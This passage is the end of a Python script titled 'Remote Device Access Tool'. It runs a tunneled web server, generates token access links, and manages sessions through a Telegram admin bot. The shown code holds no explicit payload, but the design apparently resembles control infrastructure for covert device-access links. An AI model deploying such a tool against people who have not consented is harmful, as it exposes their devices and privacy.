            msg += f"... +{len(sess)-15} more"
        await tg_send(chat, msg)

    elif cmd == "/revoke" and len(parts) > 1:
        target = parts[1]
        for s in db_list_sessions(fid):
            if s["id"].startswith(target):
                db_update_session(s["id"], expires_at=datetime.utcnow().isoformat(), status="revoked")
                if s["id"] in cfg.active_conns:
                    try:
                        await cfg.active_conns[s["id"]].close()
                    except:
                        pass
                await tg_send(chat, f"\u2705 Session <code>{target}...</code> revoked.")
                return
        await tg_send(chat, f"\u274c Session <code>{target}</code> not found.")

    elif cmd == "/clear":
        now = datetime.utcnow()
        cnt = 0
        for s in db_list_sessions(fid):
            try:
                if now > datetime.fromisoformat(s["expires_at"]):
                    db_update_session(s["id"], status="expired")
                    cnt += 1
            except:
                pass
        await tg_send(chat, f"\U0001f9f9 Cleared {cnt} expired session(s).")

    elif cmd == "/url":
        base = get_effective_public_url()
        source = "PUBLIC_URL config" if PUBLIC_URL else "Auto-detected (Cloudflare/Ngrok)" if cfg.pub_url else "Local fallback"
        await tg_send(chat,
            f"\U0001f310 <b>Public URL</b>\n"
            f"<code>{base}</code>\n\n"
            f"Source: {source}\n"
            f"Server port: {cfg.port}")

# ============================================================
# TELEGRAM POLLER
# ============================================================

async def poller():
    off = None
    log.info("Telegram bot polling started...")
    await asyncio.sleep(2)

    url = get_effective_public_url()

    await tg_send(ADMIN_ID,
        f"<b>RDA Tool v2.2 Online</b>\n"
        f"Server: {url}\n"
        f"Active connections: {len(cfg.active_conns)}\n"
        f"Send /help for commands")

    while True:
        try:
            r = await tg_poll(off)
            if r and r.get("ok"):
                for u in r.get("result", []):
                    off = u["update_id"] + 1
                    await handle_cmd(u)
        except Exception as e:
            log.error(f"Poll error: {e}")
        await asyncio.sleep(1)

# ============================================================
# MAINTENANCE TASKS
# ============================================================

async def cleanup():
    while True:
        await asyncio.sleep(300)
        try:
            conn = _db_conn()
            now = datetime.utcnow().isoformat()
            expired = conn.execute(
                "SELECT id FROM sessions WHERE expires_at<? AND status NOT IN ('expired','revoked')",
                (now,)
            ).fetchall()
            for (sid,) in expired:
                db_update_session(sid, status="expired")
                if sid in cfg.active_conns:
                    try:
                        await cfg.active_conns[sid].close()
                    except:
                        pass
                    del cfg.active_conns[sid]
            conn.close()
        except Exception as e:
            log.error(f"Cleanup error: {e}")

async def tunnel_refresh():
    """
    Continuously scan for tunnel URLs.
    This allows starting cloudflared/ngrok AFTER the script has already started.
    The URL will be detected and used within 10-15 seconds.
    """
    while True:
        await asyncio.sleep(10)  # Check every 10 seconds
        try:
            if not PUBLIC_URL:  # Only auto-detect if user didn't set a fixed URL
                url = await discover_tunnel_url()
                if url and url != cfg.pub_url:
                    cfg.pub_url = url
                    log.info(f"[+] Tunnel URL auto-detected: {cfg.pub_url}")
                    # Notify admin about the URL update
                    await tg_send(ADMIN_ID,
                        f"\U0001f310 <b>Tunnel URL Detected</b>\n"
                        f"<code>{cfg.pub_url}</code>\n"
                        f"Use /generate to create an access link.")
        except:
            pass

# ============================================================
# BANNER
# ============================================================

BANNER = r"""
██████╗ ██████╗  █████╗     ████████╗ ██████╗  ██████╗ ██╗
██╔══██╗██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
██║  ██║██████╔╝███████║       ██║   ██║   ██║██║   ██║██║
██║  ██║██╔══██╗██╔══██║       ██║   ██║   ██║██║   ██║██║
██████╔╝██║  ██║██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
 Remote Device Access Tool v2.2 - Automatic Tunnel Detection
"""

# ============================================================
# MAIN
# ============================================================

async def main():
    print(BANNER)
    print(f"  Environment: {'TERMUX (Android)' if IS_TERMUX else 'Linux'}")
    print(f"  Data directory: {get_data_dir()}")
    print(f"  Port: {cfg.port}")
    print(f"  Heartbeat: {WS_HEARTBEAT_INTERVAL}s | Session TTL: {SESSION_TTL_HOURS}h")
    print(f"  Tunnel detection: Active (scanning every 10s)")
    print("=" * 50)

    # --- Step 1: Free the port ---
    print(f"\n[*] Checking port {cfg.port}...")
    if not kill_process_on_port(cfg.port):
        print(f"[!] Could not free port {cfg.port}. Trying alternative...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', 0))
        alt_port = sock.getsockname()[1]
        sock.close()
        print(f"[*] Using alternative port: {alt_port}")
        cfg.port = alt_port
    print(f"[+] Port {cfg.port} is available")

    # --- Step 2: Attempt initial tunnel discovery ---
    print("\n[*] Scanning for active tunnels...")
    if PUBLIC_URL:
        print(f"[+] Using configured PUBLIC_URL: {PUBLIC_URL}")
    else:
        cfg.pub_url = await discover_tunnel_url()
        if cfg.pub_url:
            print(f"[+] Tunnel detected: {cfg.pub_url}")
        else:
            print("[!] No tunnel detected yet.")
            print("    Start cloudflared or ngrok in another terminal:")
            print(f"    cloudflared tunnel --url http://localhost:{cfg.port}")
            print(f"    ngrok http {cfg.port}")
            print("    The tunnel URL will be auto-detected within 10 seconds.")

    # --- Step 3: Initialize database ---
    print("\n[*] Initializing database...")
    init_db()

    # --- Step 4: Build web app ---
    app = web.Application()

    async def root(_):
        return web.Response(
            text=f"RDA Server v2.2\nStatus: Running\nActive connections: {len(cfg.active_conns)}\n"
                 f"Public URL: {get_effective_public_url()}\nPort: {cfg.port}",
            content_type="text/plain"
        )

    app.router.add_get("/", root)
    app.router.add_get("/a/{token}", index)
    app.router.add_get("/ws", ws_handler)

    # --- Step 5: Start background tasks ---
    poll_task = asyncio.create_task(poller())
    clean_task = asyncio.create_task(cleanup())
    tunnel_task = asyncio.create_task(tunnel_refresh())

    # --- Step 6: Run server ---
    print(f"\n[+] Server running on {HOST}:{cfg.port}")
    print(f"[+] Public URL: {get_effective_public_url()}")
    print(f"[+] Send /generate to your Telegram bot")
    print("[+] Press Ctrl+C to stop\n")

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, HOST, cfg.port)
    await site.start()

    try:
        await asyncio.Event().wait()
    except (asyncio.CancelledError, KeyboardInterrupt):
        print("\n[*] Shutting down...")
    finally:
        poll_task.cancel()
        clean_task.cancel()
        tunnel_task.cancel()
        await runner.cleanup()
        print("[*] Goodbye.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
